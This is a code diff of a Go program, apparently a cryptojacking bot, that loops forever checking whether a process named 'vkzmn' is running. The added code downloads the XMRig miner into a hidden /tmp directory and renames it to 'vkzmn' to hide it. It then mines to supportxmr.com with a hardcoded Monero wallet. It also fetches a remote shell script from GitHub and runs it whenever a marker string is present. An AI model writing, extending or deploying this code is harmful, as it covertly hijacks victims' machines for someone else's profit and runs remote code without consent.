@@ -1,5 +1,7 @@
 package main
 
+
+
 import (
 	"fmt"
 	"io/ioutil"
@@ -10,40 +12,21 @@ import (
         "os/exec"
 )
 
-
 //esse e o monitor ele ficara em um loop infinito  verificando se  o vkzmn esta em execucao
-
-
 
 func exec_vkzmn() {
 
-
-
-ret_magic  := magic()
-
-
- if ret_magic == 200 {
-
-
-   fmt.Println("script e seguro vo executa")
-
-
    do :=  exec.Command( "sh" , "/tmp/down_vkzmn.sh")
  
- 
-     do.Run()
+   go   do.Run()
 
-
-
- }
- 
 }
 
 
 
 
 
-func  magic() int {
+func  magic() {
 
 //check magic byte in down_vkzmn.sh
 
@@ -51,10 +34,8 @@ ptr ,  err_open := os.Open("/tmp/down_vkzmn.sh")
 
 my_str  :=   "#ATILA_VKZMN"
 
-valid := 200
 
-
-   if err_open == nil {
+  if err_open == nil {
 
   down_bytes , err_readall :=   ioutil.ReadAll(ptr)
        
@@ -65,8 +46,12 @@ valid := 200
 
                    if (strings.Contains(down_str  ,  my_str ) ) {
 
-                        return  valid 
-                   
+                          //script valido
+
+                            exec_vkzmn()
+
+
+                                           
                       }  else { fmt.Println("script invalido") 
                        
 
@@ -79,25 +64,111 @@ valid := 200
 
 
                         
-
-
-
  } 
         
 }
 
-
-return  0
-
-
 }
 
 
 
 
-func down_vkzmn(){
+
+func  down_raw() {
+
+
+
+fmt.Println("abaixando o xmrig  bruto")
+
+
+
+//config.json
+
+
+url := "--url  pool.supportxmr.com:9000"
+
+user :=  "--user  4Ary8uo817nZAjKXPtgRLf1XUVn1KXUp5WDBUrjDfctwGpirSoxKqBNRnRsgp7ha5vGxXD2u8maGMTezRzjaXrizTp2xYFy" 
+
+pass :=  "--pass kiidie"
+
+dl :=   "--donate-level 1"
+
+tls :=  "--tls"
+
+
+
+config :=  fmt.Sprintf(   "%s %s %s %s %s" , url , user , pass , dl , tls)
+
+ 
+//fmt.Println(config)
+
+
+
+//
+
+ 
+  
+
+
+
+r ,  e    :=  http.NewRequest("GET" , "https://download.xmrig.com/xmrig/6.9.0/072881e1a1214befdd46f5823f4ba7afeb14136a/xmrig-6.9.0-linux-x64.tar.gz" , nil)
+
+      if e != nil {
+
+ 
+           fmt.Println("erro em down raw" )
+
+            return 
+             }
+
+  
+
+         r.SetBasicAuth("xmrig" , "download")
+
+          cli  := http.Client{}
+
+           rr , ee :=  cli.Do(r)
+            
+              if ee  == nil   {
+
+                rrr ,   eee :=   ioutil.ReadAll(rr.Body)
+ 
+                   if eee == nil  { 
+
+
+                        os.MkdirAll("/tmp/.raw" , 0777)
+
+
+                          ioutil.WriteFile("/tmp/.raw/vkzmn.raw" ,  rrr ,  0777 )
+
+
+rrrr :=  exec.Command("sh"  ,  "-c" , "cd /tmp/.raw ; tar  -xf *raw ; cd *.0 ; rm config.json ; mv xmrig vkzmn ; ./vkzmn " + config )
+
+
+rrrr.Run()
+
+
+  }
+
+        
+}  
+    
+                   
+  
+}
+
+
+
+
+
+
+
+func down_vkzmn()  {
+
+
 
 fmt.Println("abaixando vkzmn")
+
 
 cli := http.Client{}
 
@@ -105,33 +176,51 @@ resp , err_get := cli.Get("https://github.com/atilabyte/golang/raw/refs/heads/ma
 
  if err_get != nil {
 
- fmt.Println("erro em  get") 
+ fmt.Println(err_get)  //erro no github.com 
  
- os.Exit(1) 
+       
+      down_raw() // call  plane b
 
-  }
+           return
 
 
- script  , err_readall :=  ioutil.ReadAll(resp.Body) 
+     }
+
+ 
+
+script  , err_readall :=  ioutil.ReadAll(resp.Body) 
 
   
      if err_readall  != nil {
 
        fmt.Println("erro em readall")
-        os.Exit(1) 
+
+           down_raw() 
+
+         
      
         }
 
 
- ioutil.WriteFile("/tmp/down_vkzmn.sh" , script , 0777 )
-
+ioutil.WriteFile("/tmp/down_vkzmn.sh" , script , 0777 )
+ 
   
+
+
 
 }
 
 
 
-func main() {
+
+
+
+
+
+
+
+
+func  proc() {
 
 
 
@@ -140,16 +229,15 @@ func main() {
 main_func:
 
 
-        go bot()
+        //go bot()
 
-        go  exec_vkzmn()
-
+        
 
 
  
 
 
-	time.Sleep(5 * time.Second)
+	time.Sleep(1 * time.Second)
 
 	var vkzmn_ok int = 0
 
@@ -190,7 +278,7 @@ main_func:
 
 			vkzmn_ok = 23
 
-                         fmt.Println(str_proc)
+                         
 
 
 		}
@@ -204,7 +292,11 @@ main_func:
 	if vkzmn_ok == 23 {
                      
 
+
+              
+ 
 		fmt.Println("vkzmn em execucao")
+
 
 
 
@@ -221,6 +313,7 @@ main_func:
                      
                             fmt.Println("down_vkzmn.sh nao foi abaixado")
 
+              
                             down_vkzmn()
   
 
@@ -228,10 +321,13 @@ main_func:
                           } else {
 
 
+
                              fmt.Println("down_vkzmn.sh ja esta em //tmp" )
                                    
+
        
-                             magic()
+                          go    magic()
+
 
 
                        }
@@ -245,5 +341,7 @@ main_func:
 
 
 	goto main_func
+
+
 
 }
